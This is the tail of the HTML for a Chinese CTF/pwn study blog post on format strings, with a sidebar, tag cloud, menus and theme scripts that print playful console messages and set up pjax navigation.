class="toc-text">fmt_demo（格式化字符串的综合利用）</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/21/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/" title="格式化字符串">格式化字符串</a><time datetime="2025-07-21T01:05:48.000Z" title="Created 2025-07-21 09:05:48">2025-07-21</time></div></div><div class="aside-list-item"><div class="content"><a class="title" href="/2025/07/20/HarekazeCTF2019-baby-rop2/" title="ret2libc-printf">ret2libc-printf</a><time datetime="2025-07-20T06:53:58.000Z" title="Created 2025-07-20 14:53:58">2025-07-20</time></div></div><div class="aside-list-item"><div class="content"><a class="title" href="/2025/07/18/ciscn-2019-es-2/" title="ciscn_2019_es_2">ciscn_2019_es_2</a><time datetime="2025-07-18T11:03:47.000Z" title="Created 2025-07-18 19:03:47">2025-07-18</time></div></div><div class="aside-list-item"><div class="content"><a class="title" href="/2025/07/18/bjdctf-2020-babystack2/" title="bjdctf_2020_babystack2">bjdctf_2020_babystack2</a><time datetime="2025-07-18T09:18:45.000Z" title="Created 2025-07-18 17:18:45">2025-07-18</time></div></div><div class="aside-list-item"><div class="content"><a class="title" href="/2025/07/17/Youngter-drive/" title="Youngter-drive">Youngter-drive</a><time datetime="2025-07-17T12:30:33.000Z" title="Created 2025-07-17 20:30:33">2025-07-17</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2020 - 2025 By <a class="footer-bar-link" href="/" title="John Doe" target="_blank">John Doe</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">Articles</div><div class="length-num">13</div></a><a href="/tags/" title="tag"><div class="headline">Tags</div><div class="length-num">16</div></a><a href="/categories/" title="category"><div class="headline">Categories</div><div class="length-num">0</div></a></div><span class="sidebar-menu-item-title">Function</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="Display Mode"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>Display Mode</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://image.anheyu.com/" title="安知鱼图床"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://image.anheyu.com/favicon.ico" alt="安知鱼图床"/><span class="back-menu-item-text">安知鱼图床</span></a></div></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/BUU/" style="font-size: 0.88rem;">BUU<sup>4</sup></a><a href="/tags/NSS/" style="font-size: 0.88rem;">NSS<sup>3</sup></a><a href="/tags/PWN/" style="font-size: 0.88rem;">PWN<sup>4</sup></a><a href="/tags/RC4/" style="font-size: 0.88rem;">RC4<sup>1</sup></a><a href="/tags/RC4%E5%8F%98%E5%BC%8F/" style="font-size: 0.88rem;">RC4变式<sup>1</sup></a><a href="/tags/RE/" style="font-size: 0.88rem;">RE<sup>3</sup></a><a href="/tags/SMC/" style="font-size: 0.88rem;">SMC<sup>1</sup></a><a href="/tags/TEA/" style="font-size: 0.88rem;">TEA<sup>1</sup></a><a href="/tags/WP/" style="font-size: 0.88rem;">WP<sup>2</sup></a><a href="/tags/printf/" style="font-size: 0.88rem;">printf<sup>1</sup></a><a href="/tags/pwn-study/" style="font-size: 0.88rem;">pwn_study<sup>3</sup></a><a href="/tags/ret2libc-printf/" style="font-size: 0.88rem;">ret2libc_printf<sup>1</sup></a><a href="/tags/%E5%8A%A8%E8%B0%83/" style="font-size: 0.88rem;">动调<sup>1</sup></a><a href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" style="font-size: 0.88rem;">栈溢出<sup>1</sup></a><a href="/tags/%E7%8C%9C%E6%95%B0/" style="font-size: 0.88rem;">猜数<sup>1</sup></a><a href="/tags/%E8%8A%B1%E6%8C%87%E4%BB%A4/" style="font-size: 0.88rem;">花指令<sup>1</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="Switch Between Traditional Chinese And Simplified Chinese">繁</button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8152976493" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random" volume="0.7"></meting-js></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.umd.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
+var HoldLog = console.log;
+console.log = function () {};
+let now1 = new Date();
+queueMicrotask(() => {
+  const Log = function () {
+    HoldLog.apply(console, arguments);
+  }; //在恢复前输出日志
+  const grt = new Date("04/01/2021 00:00:00"); //此处修改你的建站时间或者网站上线时间
+  now1.setTime(now1.getTime() + 250);
+  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
+  const dnum = Math.floor(days);
+  const ascll = [
+    `欢迎使用安知鱼!`,
+    `生活明朗, 万物可爱`,
+    `
+        
+       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
+      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
+      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
+      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
+      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
+      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
+        
+        `,
+    "已上线",
+    dnum,
+    "天",
+    "©2020 By 安知鱼 V1.6.14",
+  ];
+  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];
+
+  setTimeout(
+    Log.bind(
+      console,
+      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
+      "color:#425AEF",
+      "",
+      "color:#425AEF",
+      "color:#425AEF",
+      "",
+      "color:#425AEF",
+      ""
+    )
+  );
+  setTimeout(
+    Log.bind(
+      console,
+      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
+      "color:white; background-color:#4fd953",
+      "",
+      "",
+      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
+    )
+  );
+
+  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));
+
+  setTimeout(
+    console.warn.bind(
+      console,
+      "%c ⚡ Powered by 安知鱼 %c 你正在访问 John Doe 的博客.",
+      "color:white; background-color:#f0ad4e",
+      ""
+    )
+  );
+
+  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));
+
+  setTimeout(
+    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
+  );
+});</script><script async src="/anzhiyu/random.js"></script><div class="js-pjax"><input type="hidden" name="page-type" id="page-type" value="post"></div><script>var visitorMail = "";
+</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+  // removeEventListener scroll 
+  anzhiyu.removeGlobalFnEvent('pjax')
+  anzhiyu.removeGlobalFnEvent('themeChange')
+
+  document.getElementById('rightside').classList.remove('rightside-show')
   
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
 
+  typeof typed === 'object' && typed.destroy()
 
-  <div class="fixed top-0 bottom-0 left-0 right-0 pointer-events-none print:hidden" id="maple"></div>
-</body>
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+})
 
-</html>
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', e => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>
